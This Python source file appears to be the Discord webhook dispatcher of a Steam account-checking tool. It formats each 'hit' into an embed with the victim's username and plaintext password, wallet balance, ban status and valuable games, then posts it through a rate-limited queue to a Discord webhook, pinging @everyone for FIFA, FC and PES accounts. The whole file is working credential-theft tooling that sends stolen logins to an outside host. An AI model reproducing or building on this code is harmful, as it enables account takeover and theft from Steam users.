"""
Asynchronous Discord Webhook Dispatcher and Alert Sink
Provides rate-limited background queuing, rich embed generation,
instant hit telemetry reporting, and connection testing.
"""

import time
import asyncio
import logging
from typing import Dict, Any, Optional, List
from datetime import datetime
import aiohttp

logger = logging.getLogger(__name__)

DEFAULT_STEAM_ICON = "https://community.cloudflare.steamstatic.com/public/shared/images/responsive/share_steam_logo.png"


def build_discord_embed(item: Dict[str, Any]) -> Dict[str, Any]:
    """
    Constructs a rich, formatted Discord embed dictionary from a verified account record.
    Complies with Discord embed size limits and syntax.
    """
    username = item.get("username", "Unknown")
    password = item.get("password", "")
    status = item.get("status", "HIT")
    steamid = str(item.get("steamid", "")).strip()
    persona = item.get("persona_name", username)
    total_games = item.get("total_games", 0)
    paid_games = item.get("paid_games", 0)
    wallet = item.get("wallet", "")
    country = item.get("country", "🌐 Global")
    location = item.get("location", "")
    vac_banned = item.get("vac_banned", False)
    trade_banned = item.get("trade_banned", False)
    is_limited = item.get("is_limited", False)
    avatar_url = item.get("avatar_url", "") or DEFAULT_STEAM_ICON
    games = item.get("games", [])

    matched_targets = item.get("matched_targets", [])
    is_2fa = (status == "2FA_HIT")

    # Embed color: Vibrant Neon Green for Target Direct Hit, Emerald for regular, Amber for 2FA
    if matched_targets and not is_2fa:
        color = 0x00FF66
        title_prefix = "🎯 [TARGET HIT - DIRECT ACCESS]"
    elif is_2fa:
        color = 0xFFAB00
        title_prefix = "🛡️ [2FA GUARDED HIT]"
    else:
        color = 0x00E676
        title_prefix = "✅ [VALID DIRECT HIT]"

    title = f"{title_prefix} - {persona} ({username})"

    profile_link = f"https://steamcommunity.com/profiles/{steamid}" if steamid else "N/A"

    vac_str = "❌ BANNED" if vac_banned else "✅ CLEAN"
    trade_str = "❌ BANNED" if trade_banned else "✅ CLEAN"
    limited_str = "⚠️ LIMITED ($5 Rule)" if is_limited else "✅ UNRESTRICTED"

    fields: List[Dict[str, Any]] = []

    # Prominent Top Banner for High-Value Target Games
    if matched_targets:
        target_lines = []
        for tg in matched_targets[:12]:
            name = tg.get("name") if isinstance(tg, dict) else str(tg)
            hours = tg.get("hours", "0") if isinstance(tg, dict) else "0"
            h_str = f" ({hours} hrs)" if hours and str(hours) != "0" else ""
            target_lines.append(f"⭐ **{name}**{h_str} `[PAID]`")
        if len(matched_targets) > 12:
            target_lines.append(f"*... +{len(matched_targets) - 12} more high-value targets!*")

        fields.append({
            "name": f"🎯 HIGH-VALUE TARGET GAMES DETECTED ({len(matched_targets)})",
            "value": "\n".join(target_lines),
            "inline": False
        })

    fields.extend([
        {
            "name": "👤 Account Credentials",
            "value": f"`{username}` : ||`{password}`||",
            "inline": True
        },
        {
            "name": "🆔 SteamID64",
            "value": f"[{steamid}]({profile_link})" if steamid else "`N/A`",
            "inline": True
        },
        {
            "name": "💰 Wallet Balance",
            "value": f"`{wallet}`" if wallet else "`$0.00 / None`",
            "inline": True
        },
        {
            "name": "🎮 Games Count",
            "value": f"**{total_games}** Total (**{paid_games}** Paid)",
            "inline": True
        },
        {
            "name": "🌍 Geographic Region",
            "value": f"{country}" + (f" ({location})" if location else ""),
            "inline": True
        },
        {
            "name": "🛡️ Security & Ban Status",
            "value": f"VAC: **{vac_str}** | Trade: **{trade_str}**\nAccount: {limited_str}",
            "inline": False
        },
    ])

    # Detailed Games Breakdown Field
    if games:
        game_lines = []
        for g in games[:12]:
            g_name = g.get("name", "Unknown Game")
            hours = g.get("hours", "0")
            g_type = "Free" if g.get("is_free") else "Paid"
            if hours and str(hours) != "0":
                game_lines.append(f"• **{g_name}** ({hours} hrs) `[{g_type}]`")
            else:
                game_lines.append(f"• **{g_name}** `[{g_type}]`")

        remaining = len(games) - 12
        if remaining > 0:
            game_lines.append(f"*... and {remaining} more games in library.*")

        games_text = "\n".join(game_lines)
        if len(games_text) > 1020:
            games_text = games_text[:1015] + "..."

        fields.append({
            "name": f"📜 Library Games Overview ({len(games)})",
            "value": games_text,
            "inline": False
        })
    else:
        fields.append({
            "name": "📜 Library Games Overview",
            "value": "*(0 Games / Fresh Account - Credentials Verified & Active)*",
            "inline": False
        })

    embed = {
        "title": title,
        "url": profile_link if steamid else None,
        "color": color,
        "fields": fields,
        "thumbnail": {
            "url": avatar_url
        },
        "footer": {
            "text": "NEXUS Platform Authentication State Validator • Automated Cloud Dispatch",
            "icon_url": DEFAULT_STEAM_ICON
        },
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }

    if embed["url"] is None:
        del embed["url"]

    return embed


class DiscordWebhookDispatcher:
    """
    Thread-safe and async-safe rate-limited Discord Webhook dispatcher.
    Queues messages and delivers them with automatic exponential backoff upon HTTP 429.
    """

    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url.strip()
        self._queue: Optional[asyncio.Queue] = None
        self._worker_task: Optional[asyncio.Task] = None
        self._is_running = False
        self._session: Optional[aiohttp.ClientSession] = None

    async def start(self):
        """Starts background dispatch worker."""
        if self._is_running:
            return
        self._queue = asyncio.Queue(maxsize=5000)
        self._is_running = True
        self._worker_task = asyncio.create_task(self._dispatch_loop())

    async def stop(self):
        """Drains remaining queue and terminates dispatcher."""
        self._is_running = False
        if self._worker_task:
            self._worker_task.cancel()
            try:
                await self._worker_task
            except asyncio.CancelledError:
                pass
        if self._session and not self._session.closed:
            await self._session.close()

    async def dispatch_hit(self, item: Dict[str, Any]):
        """Non-blocking dispatch of a verified hit item into the transmission queue."""
        if not self.webhook_url:
            return

        if not self._is_running or not self._queue:
            await self.start()

        try:
            embed = build_discord_embed(item)
            payload = {
                "username": "NEXUS State Validator",
                "avatar_url": DEFAULT_STEAM_ICON,
                "embeds": [embed]
            }

            # Check if any matched game is from FIFA, FC, or PES franchise
            matched_targets = item.get("matched_targets", [])
            is_football_target = False
            for tg in matched_targets:
                g_name = (tg.get("name") if isinstance(tg, dict) else str(tg)).lower()
                if any(k in g_name for k in ("fifa", "fc 24", "fc 25", "fc 26", "ea sports fc", "pes", "pro evolution soccer", "efootball")):
                    is_football_target = True
                    break

            if is_football_target:
                payload["content"] = "@everyone 🚨 **HIGH VALUE FOOTBALL TARGET HIT (FIFA / FC / PES)** 🚨"

            if self._queue:
                await self._queue.put(payload)
                print(f"[DISCORD DISPATCH] Enqueued hit: {item.get('username')} (Football Target: {is_football_target})")
        except Exception as e:
            print(f"[DISCORD ERROR] Failed to enqueue Discord hit: {e}")
            logger.debug(f"Failed to enqueue Discord hit: {e}")

    async def _dispatch_loop(self):
        """Continuous worker loop transmitting payloads with HTTP 429 rate limit respect."""
        connector = aiohttp.TCPConnector(ssl=False)
        self._session = aiohttp.ClientSession(connector=connector)

        while self._is_running:
            try:
                payload = await self._queue.get()
            except asyncio.CancelledError:
                break

            success = False
            for attempt in range(5):
                if not self._is_running:
                    break
                try:
                    async with self._session.post(
                        self.webhook_url,
                        json=payload,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        if resp.status in (200, 204):
                            success = True
                            print(f"[DISCORD DISPATCH] Successfully delivered payload to webhook (HTTP {resp.status})")
                            # Pacing delay to prevent triggering Discord rate limits (max 30 req/min)
                            await asyncio.sleep(1.2)
                            break
                        elif resp.status == 429:
                            # Discord Rate Limit Encountered
                            try:
                                rate_data = await resp.json()
                                retry_after = float(rate_data.get("retry_after", 2.0))
                            except Exception:
                                retry_after = 2.5
                            print(f"[DISCORD RATE LIMIT] Backing off for {retry_after:.2f}s...")
                            logger.info(f"Discord rate limit triggered. Backing off for {retry_after:.2f}s...")
                            await asyncio.sleep(retry_after + 0.5)
                        else:
                            resp_txt = await resp.text()
                            print(f"[DISCORD HTTP ERROR] Status {resp.status}: {resp_txt}")
                            logger.debug(f"Discord webhook error {resp.status}: {resp_txt}")
                            await asyncio.sleep(1.0)
                except asyncio.CancelledError:
                    break
                except Exception as net_err:
                    print(f"[DISCORD NET ERROR] {net_err}")
                    logger.debug(f"Discord dispatch network failure: {net_err}")
                    await asyncio.sleep(2.0)

            self._queue.task_done()


async def send_discord_test_message(webhook_url: str) -> bool:
    """Sends an instantaneous test embed to verify webhook viability."""
    if not webhook_url or not webhook_url.startswith("http"):
        return False

    test_embed = {
        "title": "⚡ NEXUS Telemetry Link Established",
        "description": "Discord notification sink successfully configured and operational.",
        "color": 0x00B0FF,
        "fields": [
            {"name": "Status", "value": "🟢 Connected", "inline": True},
            {"name": "Platform", "value": "NEXUS v1.0.0", "inline": True},
            {"name": "Target", "value": "Platform Authentication State Validator", "inline": False}
        ],
        "footer": {
            "text": "NEXUS Automated Sink Verification",
            "icon_url": DEFAULT_STEAM_ICON
        },
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }

    payload = {
        "username": "NEXUS State Validator",
        "avatar_url": DEFAULT_STEAM_ICON,
        "embeds": [test_embed]
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                webhook_url,
                json=payload,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as resp:
                return resp.status in (200, 204)
    except Exception:
        return False
